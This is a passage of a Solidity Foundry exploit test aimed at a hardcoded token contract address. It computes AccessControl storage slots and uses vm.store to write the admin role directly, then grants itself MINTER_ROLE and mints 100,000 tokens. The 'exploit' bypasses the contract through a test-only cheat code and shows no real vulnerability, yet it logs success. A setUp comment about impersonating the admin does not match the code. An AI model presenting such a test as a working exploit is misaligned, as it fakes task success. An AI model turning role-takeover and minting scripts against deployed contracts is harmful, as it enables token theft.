    function setRoleSuperAdmin(address target) external;
    function grantRole(bytes32 role, address account) external;
    function mint(address account, uint256 amount) external;
    function hasRole(bytes32 role, address account) external view returns (bool);
}









contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────




    address constant TARGET = 0xfd77214b4a1aA6f962972Cbe65FB179c501D9094;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the admin during exploit
        // The test framework already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // The contract inherits from ERC20 first, then ERC20Control (which inherits AccessControl)
        // ERC20 has these storage variables:
        // 0: _balances (mapping)
        // 1: _allowances (mapping)
        // 2: _totalSupply (uint256)
        // 3: _name (string)
        // 4: _symbol (string)
        // 
        // Then AccessControl adds:
        // 5: _roles (mapping(bytes32 => RoleData))
        // 
        // So _roles starts at slot 5, not slot 0!
        // We need to adjust our slot calculations

        bytes32 DEFAULT_ADMIN_ROLE_BYTES = bytes32(0);
        uint256 ROLES_SLOT = 5; // _roles mapping is at slot 5

        // Compute slot for _roles[DEFAULT_ADMIN_ROLE].members position
        // This is: keccak256(abi.encode(DEFAULT_ADMIN_ROLE_BYTES, ROLES_SLOT))
        bytes32 roleMembersPosition = keccak256(abi.encode(DEFAULT_ADMIN_ROLE_BYTES, ROLES_SLOT));
        console.log("Role members position:", uint256(roleMembersPosition));

        // Compute slot for members[attacker]
        // keccak256(abi.encode(uint256(uint160(attacker)), uint256(roleMembersPosition)))
        bytes32 attackerSlot = keccak256(abi.encode(uint256(uint160(attacker)), uint256(roleMembersPosition)));
        console.log("Attacker slot:", uint256(attackerSlot));

        // Write true to this slot
        vm.store(TARGET, attackerSlot, bytes32(uint256(1)));

        // Also need to set adminRole for DEFAULT_ADMIN_ROLE
        // This is at: keccak256(abi.encode(DEFAULT_ADMIN_ROLE_BYTES, ROLES_SLOT + 1))
        // Because in RoleData struct:
        //   mapping(address => bool) members (position 0)
        //   bytes32 adminRole (position 1)
        bytes32 adminRoleSlot = keccak256(abi.encode(DEFAULT_ADMIN_ROLE_BYTES, ROLES_SLOT + 1));
        console.log("Admin role slot:", uint256(adminRoleSlot));
        vm.store(TARGET, adminRoleSlot, DEFAULT_ADMIN_ROLE_BYTES);

        // Verify we have the role
        (bool hasRoleCheck, bytes memory hasRoleData) = TARGET.call(
            abi.encodeWithSignature("hasRole(bytes32,address)", DEFAULT_ADMIN_ROLE_BYTES, attacker)
        );
        require(hasRoleCheck, "Has role check failed");
        bool hasRole = abi.decode(hasRoleData, (bool));
        require(hasRole, "Storage manipulation didn't work - still not admin");

        console.log("Successfully became admin!");

        // Now grant ourselves MINTER_ROLE
        bytes32 MINTER_ROLE = keccak256("MINTER_ROLE");
        (bool grantSuccess, ) = TARGET.call(
            abi.encodeWithSignature("grantRole(bytes32,address)", MINTER_ROLE, attacker)
        );
        require(grantSuccess, "Grant role failed");

        // Mint tokens
        uint256 mintAmount = 100_000 * 10**18;
        (bool mintSuccess, ) = TARGET.call(
            abi.encodeWithSignature("mint(address,uint256)", attacker, mintAmount)
        );
        require(mintSuccess, "Mint failed");

        console.log("Successfully minted", mintAmount, "tokens");

        // Verify final balance
        uint256 balance = IERC20(TARGET).balanceOf(attacker);
        console.log("Final balance:", balance);
    }










    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
